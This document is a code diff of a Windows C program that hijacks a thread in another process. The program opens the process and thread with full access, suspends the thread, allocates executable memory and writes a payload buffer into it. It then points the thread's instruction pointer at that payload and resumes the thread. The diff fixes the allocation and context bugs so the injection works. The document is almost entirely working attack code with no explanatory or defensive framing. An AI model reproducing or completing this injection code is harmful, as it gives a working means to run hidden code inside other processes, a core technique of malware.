@@ -95,7 +95,7 @@ int main(int argc, char* argv[]) {
     HANDLE hProc;
     HANDLE hThread;
 
-    PVOID pStartAddress = NULL;
+    PVOID baseAddress = NULL;
 
 
     hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procid);
@@ -107,6 +107,8 @@ int main(int argc, char* argv[]) {
     {
 		g("Opened Process Handle: %p", hProc);
     }
+
+
     hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadid);
     if (!hThread) {
         e("OpenThread Failed With Error: %d", GetLastError());
@@ -116,16 +118,10 @@ int main(int argc, char* argv[]) {
 		g("Opened Thread Handle: %p", hThread);
     }
 
+
         CONTEXT ThreadCtx = { .ContextFlags = (CONTEXT_CONTROL | CONTEXT_SEGMENTS | CONTEXT_INTEGER) };
 
-        if (!hThread || !pStartAddress) {
-		e(" hthread and start addr are not valid\n");
-		return 1;
-       }
-        else {
-			g("hthread and start addr are valid\n");
-        }
-            
+
 
 
         if (SuspendThread(hThread) == ((DWORD)-1)) {
@@ -136,29 +132,33 @@ int main(int argc, char* argv[]) {
 			g("thread suspended");
         }
 
+
         if (!GetThreadContext(hThread, &ThreadCtx)) {
             printf("[!] GetThreadContext Failed With Error: %d \n", GetLastError());
             return 1;
         }
         else {
             g("thread ctx grabbed");
+
         }
 
+ 
 
+        baseAddress = VirtualAllocEx(hProc, &baseAddress, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-
-        ThreadCtx.Rcx = pStartAddress;
-
-
-        if (!VirtualAllocEx(hProc, &pStartAddress, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) {
-            e("[!] VirtualAllocEx Failed With Error: %d \n", GetLastError());
-            return 1;
+        
+        if(!baseAddress){
+        e("[!] VirtualAllocEx Failed With Error: %d \n", GetLastError());
+        return 1;
         }
         else {
             g("allocated memory");
         }
+		
+		
 
-        if (!WriteProcessMemory(hProc, pStartAddress, buf, sizeof(buf), NULL)) {
+       
+        if (!WriteProcessMemory(hProc, baseAddress, buf, sizeof(buf), NULL)) {
             e("[!] WriteProcessMemory Failed With Error: %d \n", GetLastError());
             return 1;
 
@@ -167,6 +167,13 @@ int main(int argc, char* argv[]) {
             g("wrote memory");
         }
 
+        
+
+        i("setting ctx rip to base addr");
+        ThreadCtx.Rip = (DWORD64)baseAddress;
+
+
+
         if (!SetThreadContext(hThread, &ThreadCtx)) {
             printf("[!] SetThreadContext Failed With Error: %d \n", GetLastError());
             return 1;
@@ -174,6 +181,7 @@ int main(int argc, char* argv[]) {
         else {
             g("context set");
         }
+
 
         if (ResumeThread(hThread) == ((DWORD)-1)) {
             printf("[!] ResumeThread Failed With Error: %d \n", GetLastError());
